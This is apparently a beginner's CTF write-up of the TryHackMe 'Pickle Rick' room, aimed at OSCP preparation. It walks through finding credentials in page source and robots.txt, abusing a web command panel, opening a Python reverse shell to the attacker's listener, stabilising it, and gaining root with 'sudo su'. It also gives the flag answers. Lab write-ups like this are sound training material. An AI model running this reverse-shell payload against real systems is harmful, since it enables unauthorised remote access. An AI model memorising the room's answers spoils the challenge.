
DOC:	WRITEUP

SITE:	TRYHACKME

DATE:	20240418

	ROOM:
 	Pickle Rick
	A Rick and Morty CTF. Help turn Rick back into a human!
	
	LINK:
	https://tryhackme.com/r/room/pickle


DISCLAIMER:	
I am a noob aspiring to nail a career change towards pentesting and hopefully 
red-teaming at some point. While at it I 'll be keeping notes for the sake of
being OSCP EXAM ready when the time comes,
		
---->	 BUT	<----
			
I 'll be leaving within these notes all the batshit crazy approaches only a noob
could think of as I go. This is so that later on, if a noob stumbles upon these notes,
they 'll understand for themselves the inevitability of mistake, error, wrong path,
en route to becoming educated and job ready proffessionals.

That said...:


------------> STARTING BOX

This Rick and Morty-themed challenge requires you to exploit a web server 
and find three ingredients to help Rick make his potion and transform himself 
back into a human from a pickle.

Deploy the virtual machine on this task and explore the web application: MACHINE_IP


What is the first ingredient that Rick needs?

	mr. meesek hair

What is the second ingredient in Rick’s potion?

	1 jerry tear 


What is the last and final ingredient?

	fleeb juice



ATTACKBOX:	10.10.115.1

TARGET_IP:	10.10.16.37

I go about visiting the ip, there 's a nice portal there Rick n Morty style:

Help Morty!

Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!

I need you to *BURRRP*....Morty, logon to my computer and find the last three secret 
ingredients to finish my pickle-reverse potion. The only problem is, I have no idea 
what the *BURRRRRRRRP*, password was! Help Morty, Help!

----> 	Ok that doesn 't say much besides screaming use burpsuite :P . 
		I 'll be going as manual as I can with this. 
		
---->	Checking source code from the browser

		<!-- Note to self, remember username! 
		Username: R1ckRul3s -->
		
		*this is on main page source code interestingly
		
		Nothing else seems to be here
		
---->	Checking common page names

		index.html	<---- HomePage
		robots.txt	<---- oh well check this out: Wubbalubbadubdub (could this be password?)
		login.php	<---- A nice login
		admin.php	<---- nop, non existent
		
----> Checking login.php

----> Credentials work	

----> User: R1ckRul3s	

----> Pass: Wubbalubbadubdub

There is a command panel and an 'execute' button in this page.
Let 's check source code here too:
		
	1. All navigation buttons go to "/denied.php"
	2. <!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->
		
		Well this is a nice base64 string so decode
	
			<string> | base64 -d
			<string> | base64 -d | base64 -d
			<string> | base64 -d | base64 -d | base64 -d
			<string> | base64 -d | base64 -d | base64 -d | base64 -d
			<string> | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
			<string> | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
		
		output: RABBITHOOOOOOOOLE, yup that was kinda expected.... 
		
----> Let 's see what commands can be executed from within the command panel

	whoami		www-data (ok that s nice)
	ps			PID TTY          TIME CMD
							1016 ?        00:00:00 htcacheclean
							1024 ?        00:00:00 php-fpm7.4
							1025 ?        00:00:00 php-fpm7.4
							1031 ?        00:00:00 apache2
							1032 ?        00:00:00 apache2
							1033 ?        00:00:00 apache2
							1034 ?        00:00:00 apache2
							1035 ?        00:00:00 apache2
							1200 ?        00:00:00 apache2
							1201 ?        00:00:00 apache2
							1202 ?        00:00:00 apache2
							1377 ?        00:00:00 sh
							1378 ?        00:00:00 ps
							
	ls -lah		total 40K
							drwxr-xr-x 3 root   root   4.0K Feb 10  2019 .
							drwxr-xr-x 3 root   root   4.0K Feb 10  2019 ..
							-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
							drwxrwxr-x 2 ubuntu ubuntu 4.0K Feb 10  2019 assets
							-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
							-rwxr-xr-x 1 ubuntu ubuntu 1.1K Feb 10  2019 denied.php
							-rwxrwxrwx 1 ubuntu ubuntu 1.1K Feb 10  2019 index.html
							-rwxr-xr-x 1 ubuntu ubuntu 1.5K Feb 10  2019 login.php
							-rwxr-xr-x 1 ubuntu ubuntu 2.0K Feb 10  2019 portal.php
							-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt

----> ok ok let's cat these text files
		
	cat clue.txt
	Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
		
Must find other ways to read/output the files, so... initializing google diving 
		
THIS WORKED:
		
	ul < clue.txt
	Look around the file system for the other ingredient.
		
I found the command here ----> https://jarv.org/posts/cat-without-cat/
		
So let 's now check the other files too!!!
		
	ul < Sup3rS3cretPickl3Ingred.txt
	mr. meeseek hair	<---- 	INGREDIENT ONE

looks like Rick maybe has a chance!
				
	ul < denied.php
hm... I should maybe try n curl this from the cli. so:

	curl 10.10.16.37/denied.php
nah, not doing anything interesting here. 
				
Since I 'm obviously on a restricted shell here,
I mean, I can execute all these linux native commands
AND I 'm www-data user soooo.. maybe get shell? 
				
	nc -lvnp 9988 
(to setup a listener for the shell on my end on port 9988 -random selection)
		
Let 's find a nice reverse shell script to throw at the CMD Panel onsite

Check:

PayloadsAllTheThings & GTFOBins & PentesterMonkey
and let 's see if and what works for this: 
		
---> Check python version ----> python3:

	which python3 -> /usr/bin/python3

so the shell one-liner must be python3
		
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	
this is for python(1) and I also must change IP/PORTS so that they correspond to my attack box so:
						
	python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.115.1",9988));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

THE MOMENT OF TRUTH ----> WE 'RE IN !!!

Let 's make the shell stable and see what we can get off this filesystem!
		
	python3 -c 'import pty;pty.spawn("/bin/bash")'
---
	export TERM=xterm
---

ctrl+z (to background session)

---
	stty raw -echo; fg
		
So far so good. Lemme check out some places here, see if there smth around to be found. 
		
----> it seems I can ;t go some places.... 

----> I wonder if I could just privesc
		
	sudo su
 ... well I didn 't expect that.. 
		----> we re root
		
OK, let 's try going places again!
		
	ls ./* | grep *.txt
in order to fetch all .txt files and voille
		----> 3rd.txt <---- I 'd expect to find the 2nd tbh :P this is weird, yet...:
		
----> 3rd INGRGEDIENT -> 

	cat 3rd.txt -> fleeb juice

So where would this 2nd ingredient be?

check other directories/ users

	-> cd home 
	-> ls 
	-> cd Rick 
	-> 'second ingredients' 
	-> cat 'second ingredients'
	-> 1 jerry tear

########################		!!! ROOM IS COMPLETE !!!		############################### 			
